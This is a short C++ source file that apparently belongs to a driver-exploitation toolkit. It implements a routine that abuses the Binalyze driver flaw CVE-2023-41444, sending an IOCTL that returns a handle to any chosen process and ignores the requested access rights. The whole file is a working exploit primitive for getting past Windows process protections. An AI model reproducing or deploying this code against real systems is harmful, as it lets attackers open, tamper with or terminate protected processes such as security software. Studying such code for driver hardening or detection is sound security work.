/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       BINALYZE.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Binalyze driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/binalyze.h"

//
// Based on CVE-2023-41444
//

/*
* BeDrvOpenProcess
*
* Purpose:
*
* Open process via Binalyze driver.
*
*/
BOOL WINAPI BeDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    BOOL bResult = FALSE;
    DWORD data = HandleToUlong(ProcessId);

    bResult = supCallDriver(DeviceHandle,
        IOCTL_IREC_OPEN_PROCESS,
        &data,
        sizeof(data),
        &data,
        sizeof(data));

    *ProcessHandle = UlongToHandle(data);

    return bResult;
}